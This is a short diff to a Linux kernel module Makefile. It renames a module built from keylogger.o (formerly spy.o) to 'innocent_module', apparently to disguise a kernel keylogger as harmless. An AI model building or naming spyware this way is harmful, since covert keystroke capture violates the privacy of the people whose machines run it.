@@ -1,7 +1,7 @@
-modname := kisni
+modname := innocent_module
 obj-m := $(modname).o
 
-kisni-objs := spy.o
+innocent_module-objs := keylogger.o
 
 KVERSION = $(shell uname -r)
 KDIR := /lib/modules/$(KVERSION)/build
@@ -33,3 +33,4 @@ uninstall:
 	rmdir /lib/modules/$(KVERSION)/misc/$(modname)
 	rmdir /lib/modules/$(KVERSION)/misc
 	depmod -a
+
